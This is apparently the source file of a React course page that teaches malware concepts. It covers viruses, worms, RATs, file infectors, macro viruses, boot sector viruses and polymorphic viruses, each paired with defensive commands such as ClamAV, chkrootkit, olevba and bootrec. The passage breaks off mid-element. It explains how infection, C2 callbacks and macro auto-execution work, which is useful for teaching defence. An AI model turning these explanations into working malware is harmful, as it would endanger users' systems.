import React, { useState, useMemo, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { useTheme } from '../contexts/ThemeContext';
import { askLLM, ChatMessage } from '../services/llm';
import { Paperclip, Mic, Send, BookOpen, FileText, Search, CheckCircle, ChevronDown, ChevronRight, PlayCircle, Terminal, Code, ClipboardList } from 'lucide-react';
import { clsx } from 'clsx';

// --- Types ---

interface Lesson {
  title: string;
  content: string; // HTML content
  duration?: string;
  syntax?: { title: string; content: string }[];
  terminalCommands?: string[];
}

interface Module {
  id: string; // e.g., 'module-1'
  title: string;
  duration: string;
  description: string;
  lessons: Lesson[];
  videoLinks?: { label: string; url: string }[];
}

interface Assignment {
  id: number;
  title: string;
  description: string;
}

interface Resource {
  type: 'video' | 'document';
  title: string;
  duration: string;
  description: string;
}

// --- Data ---

const assignments: Assignment[] = [
  { id: 1, title: 'Assignment 1: Network Security & Fundamentals', description: 'Deep dive into network protocols and securing infrastructure.' },
  { id: 2, title: 'Assignment 2: Web & Application Security', description: 'Analyzing and securing web applications against common vulnerabilities.' },
  { id: 3, title: 'Assignment 3: Cryptography & Data Security', description: 'Implementing encryption and protecting data at rest and in transit.' },
  { id: 4, title: 'Assignment 4: Operating System & Endpoint Security', description: 'Securing OS configurations and endpoint devices.' },
  { id: 5, title: 'Assignment 5: Cloud, Mobile & IoT Security Advanced', description: 'Security challenges in modern distributed environments.' },
  { id: 6, title: 'Assignment 6: Advanced Threats & Cyber Defense', description: 'Understanding and defending against APTs and sophisticated attacks.' }
];

const resources: Resource[] = [
  {
    type: 'video',
    title: 'Cyber Security Overview',
    duration: '15 min',
    description: 'Introduction to the world of Cyber Security'
  },
  {
    type: 'document',
    title: 'Course Handbook',
    duration: '20 min read',
    description: 'Guide to course structure and requirements'
  }
];

const courseData: Module[] = [
  {
    id: 'module-1',
    title: 'Module 1: Viruses & Malware Engineering',
    duration: '1 week',
    description: 'Explore the mechanics of malware, including viruses, worms, trojans, and ransomware, with ethical demonstrations.',
    lessons: [
      {
        title: 'What is a Computer Virus?',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">What is a Computer Virus?</h2>
          <p class="mb-4 text-gray-300">
            A computer virus is a type of malicious software designed to attach itself to legitimate programs or files and replicate when the infected file is executed. Unlike other malware types, a virus requires user action—such as opening a file or running a program—to activate. Once executed, it can spread to other files, applications, or systems, causing damage ranging from minor performance issues to complete system failure.
          </p>
          <p class="mb-4 text-gray-300">
            From a cybersecurity perspective, viruses are important because they represent the foundation of malware evolution. Early viruses were simple file infectors, but modern variants use advanced techniques such as obfuscation, encryption, and stealth execution to avoid detection. Viruses can corrupt files, alter system behavior, steal data, or open pathways for more advanced attacks like ransomware or backdoors.
          </p>
          <h3 class="text-lg font-semibold mb-2 text-white">Virus Lifecycle</h3>
          <p class="mb-4 text-gray-300">
            Viruses typically follow a lifecycle: infection, replication, trigger, and payload execution. The payload may delete files, modify system configurations, or spy on user activity. Understanding how viruses work helps security professionals recognize infection patterns, analyze malicious files, and design better detection mechanisms such as antivirus signatures and behavioral analysis engines.
          </p>
          <h3 class="text-lg font-semibold mb-2 text-white">Defensive Measures</h3>
          <p class="mb-4 text-gray-300">
            From a defensive standpoint, antivirus software, file integrity monitoring, sandboxing, and user awareness are key countermeasures. Studying computer viruses does not mean creating malware, but understanding how attackers design them so defenders can detect, analyze, and stop them effectively.
          </p>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: ClamAV',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Tool Details</h4>
                  <ul class="space-y-2 text-gray-300">
                    <li><span class="font-semibold text-[#00bceb]">Tool Name:</span> ClamAV</li>
                    <li><span class="font-semibold text-[#00bceb]">Category:</span> Malware Detection & Analysis</li>
                    <li><span class="font-semibold text-[#00bceb]">Purpose:</span> Scan files and systems to detect known viruses and malware signatures</li>
                    <li><span class="font-semibold text-[#00bceb]">Ethical Use:</span> Malware analysis, system defense, lab testing</li>
                  </ul>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Basic Commands</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">clamscan file.exe</code>
                      <p class="text-sm text-gray-400">Scans a specific file for known virus signatures.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">clamscan -r /home/kali/</code>
                      <p class="text-sm text-gray-400">Recursively scans a directory for malware.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">clamscan --infected --remove file.exe</code>
                      <p class="text-sm text-gray-400">Detects and removes infected files (lab use only).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">freshclam</code>
                      <p class="text-sm text-gray-400">Updates virus signature database.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Why this tool here?</h4>
                  <p class="text-gray-300">ClamAV helps students understand how viruses are detected, reinforcing defensive skills rather than creation.</p>
                </div>
              </div>
            `
          }
        ]
      },
      {
         title: 'Worms vs Viruses',
         duration: '15 min',
         content: `
           <h2 class="text-xl font-semibold mb-4 text-white">Worms vs Viruses</h2>
           <p class="mb-4 text-gray-300">
             Worms and viruses are both forms of malware, but they differ fundamentally in how they spread, operate, and impact systems. Understanding this distinction is critical for both malware analysis and defensive security design.
           </p>
           <p class="mb-4 text-gray-300">
             A computer virus requires human interaction to spread. It attaches itself to a legitimate file or program and activates only when that file is executed by a user. Because of this dependency, viruses typically spread more slowly and rely heavily on social engineering techniques such as email attachments, cracked software, or infected USB drives. Once activated, a virus can replicate, modify files, corrupt data, or install additional malicious payloads.
           </p>
           <p class="mb-4 text-gray-300">
             In contrast, a computer worm is self-replicating and autonomous. Worms do not require user interaction to spread. They actively scan networks for vulnerable systems and exploit security flaws to propagate automatically. This makes worms significantly more dangerous in enterprise environments, as a single vulnerable machine can lead to rapid, large-scale infection across an entire network.
           </p>
           <h3 class="text-lg font-semibold mb-2 text-white">Historical Context</h3>
           <p class="mb-4 text-gray-300">
             Historically, worms such as Code Red, Conficker, and WannaCry demonstrated how devastating worm-based attacks can be. WannaCry, for example, exploited a Windows SMB vulnerability and spread globally within hours, crippling hospitals, enterprises, and government systems. Worms often cause network congestion, service outages, and large-scale operational disruption.
           </p>
           <h3 class="text-lg font-semibold mb-2 text-white">Defensive Perspective</h3>
           <p class="mb-4 text-gray-300">
             From a defensive perspective, worms highlight the importance of patch management, network segmentation, intrusion detection systems, and traffic monitoring. While viruses emphasize endpoint protection and user awareness, worms demand strong network-level defenses. Modern malware often combines both characteristics—spreading like a worm while embedding itself like a virus—making detection more complex.
           </p>
           <p class="mb-4 text-gray-300">
             Understanding worms vs viruses allows security professionals to design layered defenses that address both human-based infection vectors and automated network-based attacks.
           </p>
         `,
         syntax: [
           {
             title: 'Kali Linux Tool: Wireshark',
             content: `
               <div class="space-y-6">
                 <div>
                   <h4 class="text-lg font-semibold text-white mb-2">Tool Details</h4>
                   <ul class="space-y-2 text-gray-300">
                     <li><span class="font-semibold text-[#00bceb]">Tool Name:</span> Wireshark</li>
                     <li><span class="font-semibold text-[#00bceb]">Category:</span> Network Traffic Analysis</li>
                     <li><span class="font-semibold text-[#00bceb]">Purpose:</span> Capture and analyze network traffic to detect worm-like behavior</li>
                     <li><span class="font-semibold text-[#00bceb]">Ethical Use:</span> Malware traffic analysis, incident response, network defense</li>
                   </ul>
                 </div>

                 <div>
                   <h4 class="text-lg font-semibold text-white mb-2">Why this tool for this topic?</h4>
                   <p class="text-gray-300 mb-4">Worms spread over networks, and Wireshark allows analysts to observe abnormal scanning, replication, and exploit traffic generated by worms.</p>
                 </div>

                 <div>
                   <h4 class="text-lg font-semibold text-white mb-3">Basic Commands & Usage</h4>
                   <div class="space-y-4">
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">wireshark</code>
                       <p class="text-sm text-gray-400">Launches the Wireshark GUI.</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">sudo wireshark</code>
                       <p class="text-sm text-gray-400">Runs Wireshark with elevated privileges for packet capture.</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">tcp.port == 445</code>
                       <p class="text-sm text-gray-400">Filters SMB traffic (commonly abused by worms like WannaCry).</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">ip.addr == 192.168.1.10</code>
                       <p class="text-sm text-gray-400">Filters traffic related to a specific host.</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">tcp.flags.syn == 1 && tcp.flags.ack == 0</code>
                       <p class="text-sm text-gray-400">Detects excessive SYN packets (possible worm scanning behavior).</p>
                     </div>
                   </div>
                 </div>
               </div>
             `
           }
         ]
       },
      {
         title: 'Trojans & RATs',
         duration: '15 min',
         content: `
           <h2 class="text-xl font-semibold mb-4 text-white">Trojans & Remote Access Trojans (RATs)</h2>
           <p class="mb-4 text-gray-300">
             A Trojan (or Trojan Horse) is a type of malware that disguises itself as a legitimate or useful program to trick users into executing it. Unlike viruses or worms, Trojans do not self-replicate. Instead, they rely heavily on social engineering, such as fake software installers, cracked applications, email attachments, or malicious downloads. Once executed, a Trojan performs hidden malicious actions while appearing harmless to the user.
           </p>
           <p class="mb-4 text-gray-300">
             A Remote Access Trojan (RAT) is a more dangerous and advanced form of Trojan. RATs provide attackers with remote control over an infected system, often granting full access similar to legitimate remote administration tools. Through a RAT, an attacker can view files, log keystrokes, activate webcams or microphones, steal credentials, install additional malware, and manipulate system settings—all without the victim’s knowledge.
           </p>
           <h3 class="text-lg font-semibold mb-2 text-white">Operation & Command-and-Control</h3>
           <p class="mb-4 text-gray-300">
             RATs typically operate using a command-and-control (C2) model. After infection, the RAT establishes an outbound connection to an attacker-controlled server, allowing commands to be sent remotely. Because the connection is often outbound, RAT traffic can bypass poorly configured firewalls. Modern RATs use encryption, obfuscation, and legitimate-looking network protocols (like HTTPS) to avoid detection.
           </p>
           <h3 class="text-lg font-semibold mb-2 text-white">Defense & Detection</h3>
           <p class="mb-4 text-gray-300">
             From a cybersecurity defense perspective, Trojans and RATs are extremely dangerous because they enable long-term persistence, surveillance, and data theft. Detection requires a combination of endpoint security, behavioral analysis, network monitoring, and user awareness. Understanding how Trojans and RATs work helps defenders identify suspicious processes, unusual outbound connections, and unauthorized remote control behavior.
           </p>
           <p class="mb-4 text-gray-300">
             Importantly, studying RATs in cybersecurity education is not about building them, but about recognizing their indicators, analyzing their behavior, and preventing real-world compromise.
           </p>
         `,
         syntax: [
           {
             title: 'Kali Linux Tool: Chkrootkit',
             content: `
               <div class="space-y-6">
                 <div>
                   <h4 class="text-lg font-semibold text-white mb-2">Tool Details</h4>
                   <ul class="space-y-2 text-gray-300">
                     <li><span class="font-semibold text-[#00bceb]">Tool Name:</span> Chkrootkit</li>
                     <li><span class="font-semibold text-[#00bceb]">Category:</span> Malware & Rootkit Detection</li>
                     <li><span class="font-semibold text-[#00bceb]">Purpose:</span> Detect hidden Trojans, backdoors, and rootkits on Linux systems</li>
                     <li><span class="font-semibold text-[#00bceb]">Ethical Use:</span> System inspection, malware detection, incident response (lab or owned systems only)</li>
                   </ul>
                 </div>

                 <div>
                   <h4 class="text-lg font-semibold text-white mb-2">Why this tool for this topic?</h4>
                   <p class="text-gray-300 mb-4">Many RATs and Trojans attempt to hide their presence by modifying system binaries or installing backdoors. Chkrootkit helps detect known signs of compromise, making it ideal for defensive learning.</p>
                 </div>

                 <div>
                   <h4 class="text-lg font-semibold text-white mb-3">Basic Commands & Syntax</h4>
                   <div class="space-y-4">
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">sudo chkrootkit</code>
                       <p class="text-sm text-gray-400">Runs a full system scan for known rootkits, Trojans, and backdoors.</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">sudo chkrootkit -q</code>
                       <p class="text-sm text-gray-400">Runs the scan in quiet mode (only reports suspicious findings).</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">sudo chkrootkit -x</code>
                       <p class="text-sm text-gray-400">Shows detailed information about detected issues.</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">chkrootkit | less</code>
                       <p class="text-sm text-gray-400">Pipes results for easier review and analysis.</p>
                     </div>
                   </div>
                 </div>
               </div>
             `
           }
         ]
       },
      {
         title: 'File Infectors',
         duration: '15 min',
         content: `
           <h2 class="text-xl font-semibold mb-4 text-white">File Infectors</h2>
           <p class="mb-4 text-gray-300">
             A File Infector Virus is a type of malware that attaches itself to legitimate executable files such as .exe, .dll, .com, or .sys. When the infected file is executed, the virus code runs first, then passes control to the original program so the user does not notice anything unusual. This makes file infectors particularly dangerous because they spread silently and compromise trusted software.
           </p>
           <p class="mb-4 text-gray-300">
             File infectors work by modifying executable file structures. Some inject malicious code at the beginning of a file (prepending), some at the end (appending), and others insert themselves into unused sections of the executable. Advanced file infectors preserve the original program’s size, checksum, and behavior to avoid detection.
           </p>
           <p class="mb-4 text-gray-300">
             These viruses commonly spread through pirated software, cracked applications, USB drives, email attachments, and shared executables. Once a single infected file is run, the virus scans the system for other executable files and infects them as well, leading to rapid internal spread.
           </p>
           <h3 class="text-lg font-semibold mb-2 text-white">Categories of File Infectors</h3>
           <p class="mb-4 text-gray-300">
             There are two major categories of file infectors. <span class="text-white font-semibold">Direct-action infectors</span> activate only when an infected file is executed and then exit. <span class="text-white font-semibold">Resident infectors</span> load themselves into memory and infect files as they are accessed, copied, or opened. Resident infectors are more dangerous because they stay active in the background.
           </p>
           <h3 class="text-lg font-semibold mb-2 text-white">Defense & Forensics</h3>
           <p class="mb-4 text-gray-300">
             From a defensive and forensic standpoint, file infectors are challenging because infected programs often still function normally. Detection relies on signature-based scanning, integrity checking, behavioral monitoring, and file hashing. Modern antivirus solutions also use heuristic analysis to detect suspicious changes in executable behavior.
           </p>
           <p class="mb-4 text-gray-300">
             Understanding file infectors helps security professionals identify tampered binaries, unexpected file changes, abnormal execution flows, and persistence mechanisms used by malware.
           </p>
         `,
         syntax: [
           {
             title: 'Kali Linux Tool: ClamAV (File Infection Detection)',
             content: `
               <div class="space-y-6">
                 <div>
                   <h4 class="text-lg font-semibold text-white mb-2">Tool Details</h4>
                   <ul class="space-y-2 text-gray-300">
                     <li><span class="font-semibold text-[#00bceb]">Tool Name:</span> ClamAV</li>
                     <li><span class="font-semibold text-[#00bceb]">Category:</span> Antivirus / Malware Detection</li>
                     <li><span class="font-semibold text-[#00bceb]">Purpose:</span> Scan files and executables for file infectors</li>
                     <li><span class="font-semibold text-[#00bceb]">Ethical Use:</span> Malware analysis, system defense, lab testing only</li>
                   </ul>
                 </div>

                 <div>
                   <h4 class="text-lg font-semibold text-white mb-3">Basic Commands</h4>
                   <div class="space-y-4">
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">sudo apt update && sudo apt install clamav clamav-daemon</code>
                       <p class="text-sm text-gray-400">Install ClamAV (Kali Linux).</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">sudo freshclam</code>
                       <p class="text-sm text-gray-400">Update Virus Signatures.</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">clamscan -r /path/to/directory</code>
                       <p class="text-sm text-gray-400">Scan a Directory for File Infectors.</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">clamscan --infected --recursive --bell /usr/bin</code>
                       <p class="text-sm text-gray-400">Scan Only Executable Files.</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">clamscan -r --remove /path/to/directory</code>
                       <p class="text-sm text-gray-400">Remove Infected Files (Lab Systems Only).</p>
                     </div>
                     <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                       <code class="text-green-400 block mb-1 font-mono">clamscan -r /home/user > scan_report.txt</code>
                       <p class="text-sm text-gray-400">Generate a Scan Report.</p>
                     </div>
                   </div>
                 </div>
               </div>
             `
           }
         ]
       },
      {
        title: 'Macro & Script-based Viruses',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Macro & Script-based Viruses</h2>
          <p class="mb-4 text-gray-300">
            Macro and Script-based Viruses are malware types that do not rely on traditional executable files. Instead, they abuse scripting languages and macro capabilities built into trusted applications and operating systems. Because they operate inside legitimate environments, they are harder to detect and often bypass basic antivirus protections.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Macro Viruses</h3>
          <p class="mb-4 text-gray-300">
            Macro viruses are commonly written using VBA (Visual Basic for Applications) and are embedded inside documents such as Microsoft Word, Excel, PowerPoint, and PDF files. When a user opens the document and enables macros, the malicious code executes automatically.
          </p>
          <p class="mb-4 text-gray-300">
            These viruses typically spread via email attachments, cloud file sharing, and removable media. Once executed, a macro virus can modify other documents, download additional malware, log keystrokes, or alter system settings. Since documents appear harmless, users are more likely to open them.
          </p>
          <p class="mb-4 text-gray-300">
            A dangerous feature of macro viruses is auto-execution, where macros run on events like:
          </p>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Document open</li>
            <li>Document close</li>
            <li>File save</li>
          </ul>
          <p class="mb-4 text-gray-300">
            This makes them ideal for phishing-based attacks.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Script-based Viruses</h3>
          <p class="mb-4 text-gray-300">
            Script-based viruses are written in languages such as JavaScript, VBScript, PowerShell, Python, Batch (.bat), and Shell scripts. These scripts execute directly through interpreters already present in the system. They are commonly delivered through malicious websites, email attachments, fake installers, and compromised scripts.
          </p>
          <p class="mb-4 text-gray-300">
            Script-based malware is often used for:
          </p>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Downloading payloads</li>
            <li>Creating persistence</li>
            <li>Executing system commands</li>
            <li>Credential harvesting</li>
          </ul>
          <p class="mb-4 text-gray-300">
            PowerShell-based malware is especially powerful on Windows because it can run in memory without touching disk, making detection difficult.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Why These Viruses Are Dangerous</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>No need for executable files</li>
            <li>Exploit trusted software</li>
            <li>Easy to obfuscate</li>
            <li>Cross-platform potential</li>
            <li>Frequently used in phishing attacks</li>
          </ul>

          <h3 class="text-lg font-semibold mb-2 text-white">Prevention Techniques</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Disable macros by default</li>
            <li>Use email filtering</li>
            <li>Enable PowerShell logging</li>
            <li>Monitor script execution</li>
            <li>User awareness training</li>
          </ul>
        `,
        syntax: [
          {
            title: 'Analysis & Defense Commands (Ethical Use)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Analysis & Defense Commands</h4>
                  <p class="text-gray-300 mb-4">Ethical Use: These commands are for malware analysis and system hardening.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Macro Analysis (Linux / Kali)</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">sudo apt install oletools</code>
                      <p class="text-sm text-gray-400">Install oletools (includes olevba).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">olevba suspicious.doc</code>
                      <p class="text-sm text-gray-400">Detect suspicious macros in a document.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">olevba --decode suspicious.doc</code>
                      <p class="text-sm text-gray-400">Extract and decode macros from documents.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Script Analysis</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">strings suspicious.js | less</code>
                      <p class="text-sm text-gray-400">Detect malicious strings in JavaScript files.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Windows Defense & Hardening</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"</code>
                      <p class="text-sm text-gray-400">Check PowerShell script execution logs.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Word\\Security" -Name "VBAWarnings" -Value 4</code>
                      <p class="text-sm text-gray-400">Disable macros via Group Policy (Prevents execution).</p>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Boot Sector Viruses',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Boot Sector Viruses</h2>
          <p class="mb-4 text-gray-300">
            Boot Sector Viruses are one of the earliest and most dangerous forms of malware because they target the boot process of a computer system. Instead of infecting normal files, these viruses infect the boot sector or Master Boot Record (MBR) of storage devices such as hard disks, USB drives, and floppy disks. Since the boot sector is loaded before the operating system, the virus gains control of the system at a very early stage.
          </p>
          <p class="mb-4 text-gray-300">
            When a system is powered on, the BIOS or UEFI firmware looks for boot instructions in the boot sector. If this sector is infected, the malicious code executes before any antivirus or OS-level security mechanisms start, making detection and removal difficult.
          </p>
          <p class="mb-4 text-gray-300">
            Historically, boot sector viruses spread through infected removable media, especially when systems were configured to boot from external devices. Today, although UEFI and Secure Boot have reduced their prevalence, boot-level malware still exists in more advanced forms such as bootkits and rootkits.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Capabilities of Boot Sector Viruses</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Modify or replace legitimate boot code</li>
            <li>Load malicious payloads into memory</li>
            <li>Hide malware from the operating system</li>
            <li>Reinfect the system after OS reinstallation</li>
            <li>Disable or bypass security software</li>
          </ul>
          <p class="mb-4 text-gray-300">
            Because the virus operates below the OS level, traditional file-based scanning may fail to detect it.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Types of Boot-Level Malware</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li><span class="text-white font-semibold">MBR Viruses:</span> Overwrite the Master Boot Record and redirect execution to malicious code before loading the OS.</li>
            <li><span class="text-white font-semibold">Boot Sector Viruses:</span> Infect the volume boot sector of partitions and spread when infected media is used.</li>
            <li><span class="text-white font-semibold">Bootkits:</span> Advanced variants that hook kernel-level components and remain persistent across reboots.</li>
          </ul>

          <h3 class="text-lg font-semibold mb-2 text-white">Real-World Impact</h3>
          <p class="mb-4 text-gray-300">
            Boot sector malware has been used in espionage campaigns, Advanced Persistent Threats (APTs), military-grade cyber attacks, and financial fraud systems. Because removal often requires rebuilding boot records or wiping disks, these attacks can cause severe operational damage.
          </p>
        `,
        syntax: [
          {
            title: 'Analysis & Defense Tools (Ethical Use Only)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Analysis & Defense Tools</h4>
                  <p class="text-gray-300 mb-4">Ethical Use: These commands are for forensic analysis and system recovery.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Boot Sector Analysis (Linux / Kali)</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">fdisk -l</code>
                      <p class="text-sm text-gray-400">Check Disk Boot Sector Information.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">dd if=/dev/sda of=bootsector.img bs=512 count=1</code>
                      <p class="text-sm text-gray-400">Dump Boot Sector for Analysis (Forensic use).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">strings bootsector.img</code>
                      <p class="text-sm text-gray-400">Analyze Boot Sector Strings.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hexdump -C bootsector.img | head</code>
                      <p class="text-sm text-gray-400">Check MBR Integrity.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Windows Recovery & Defense</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">bootrec /fixmbr</code>
                      <p class="text-sm text-gray-400">Repair MBR (Windows Recovery Environment).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">bootrec /fixboot</code>
                      <p class="text-sm text-gray-400">Write a new partition boot sector.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Prevention & Mitigation</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Enable UEFI Secure Boot (Blocks unauthorized boot code)</li>
                    <li>Disable booting from external devices</li>
                    <li>Use disk-level antivirus scanning</li>
                    <li>Monitor firmware integrity</li>
                    <li>Apply OS and firmware updates</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Polymorphic & Metamorphic Viruses',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Polymorphic & Metamorphic Viruses</h2>
          <p class="mb-4 text-gray-300">
            Polymorphic and Metamorphic viruses represent an advanced evolution of malware designed specifically to evade detection by traditional antivirus systems. Unlike simple viruses that have static code signatures, these viruses are capable of changing their structure every time they infect a system or replicate, making signature-based detection extremely difficult.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Polymorphic Viruses</h3>
          <p class="mb-4 text-gray-300">
            A polymorphic virus changes its encryption and appearance while keeping its core functionality the same. Each new copy of the virus encrypts its payload with a different key and modifies its decryptor routine, meaning that no two infections look exactly alike. However, once decrypted in memory, the malicious payload remains logically identical. Antivirus tools must rely on heuristics and behavior-based detection to identify such threats.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Metamorphic Viruses</h3>
          <p class="mb-4 text-gray-300">
            A metamorphic virus, on the other hand, is far more sophisticated. Instead of simply encrypting its payload, it rewrites its own code completely with every generation. The virus may reorder instructions, substitute equivalent code blocks, rename variables, insert junk instructions, or alter control flow while preserving the original behavior. This makes even heuristic detection challenging, as the malware has no consistent structure or signature.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Key Differences</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Polymorphic Viruses</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Change encryption and decryptor</li>
                <li>Core logic remains the same</li>
                <li>Easier to detect with memory analysis</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Metamorphic Viruses</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Rewrite entire code structure</li>
                <li>No consistent signature</li>
                <li>Extremely difficult to detect</li>
              </ul>
            </div>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Security Challenges & Defense</h3>
          <p class="mb-4 text-gray-300">
            Traditional antivirus systems rely heavily on signature-based scanning, which becomes ineffective against these malware types. As a result, modern defenses focus on behavioral analysis, sandboxing, machine learning detection, memory forensics, and runtime monitoring.
          </p>
        `,
        syntax: [
          {
            title: 'Malware Analysis & Detection Tools (Ethical Use Only)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Malware Analysis Tools</h4>
                  <p class="text-gray-300 mb-4">Ethical Use: These tools help analysts understand code obfuscation and mutation.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Static Analysis</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">strings suspicious_file</code>
                      <p class="text-sm text-gray-400">Identify hidden text or indicators inside obfuscated binaries.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ent suspicious_file</code>
                      <p class="text-sm text-gray-400">Check File Entropy (High entropy often indicates encryption/packing).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
